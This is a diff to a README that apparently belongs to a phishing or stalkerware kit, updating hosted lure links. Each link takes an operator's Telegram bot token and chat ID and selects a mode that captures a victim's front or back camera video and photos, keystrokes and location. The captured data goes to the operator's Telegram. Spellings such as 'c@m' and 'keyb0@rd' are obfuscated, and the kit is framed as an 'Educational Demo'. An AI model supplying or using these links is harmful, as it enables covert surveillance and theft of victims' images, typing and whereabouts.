@@ -18,7 +18,7 @@ https://yourdomain.com/index.html?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID
 
 **📸 Data Reception on private code API**
 
-![private](https://i.postimg.cc/ZnBppQjS/IMG-20250730-155721.jpg)
+![private](https://i.postimg.cc/K4Sy46BW/IMG-20251029-182007.jpg)
 
 **🎥 Educational Demo**
 > https://youtu.be/8tWrX9j5Nuo
@@ -72,31 +72,31 @@ Create a similar setup by entering your **Telegram Bot Token** and **Chat ID** o
 **Front c@m vide0 & info**
 
 ```bash
-https://vide0chat.vercel.app/video-f.html?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID
+https://vide0chat.vercel.app/chat/?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID&mode=front-video&duration=2
 ```
 
 **Back c@m vide0 & info**
 
 ```bash
-https://vide0chat.vercel.app/video-b.html?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID
+https://vide0chat.vercel.app/chat/?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID&mode=front-back&duration=2
 ```
 
 **Front c@m ph0t0 & info**
 
 ```bash
-https://vide0chat.vercel.app/video-f.html?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID
+https://vide0chat.vercel.app/chat/?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID&mode=front-photo
 ```
 
 **Back c@m ph0t0 & info**
 
 ```bash
-https://vide0chat.vercel.app/video-f.html?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID
+https://vide0chat.vercel.app/chat/?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID&mode=back-photo
 ```
 
 **keyb0@rd & l0c@tion**
 
 ```bash
-https://vide0chat.vercel.app/main.html?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID
+https://vide0chat.vercel.app/main/?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID
 ```
 
 ⚠️ **Replace** `YOUR_TOKEN` and `YOUR_CHAT_ID` with your actual Telegram Bot Token and Chat ID.
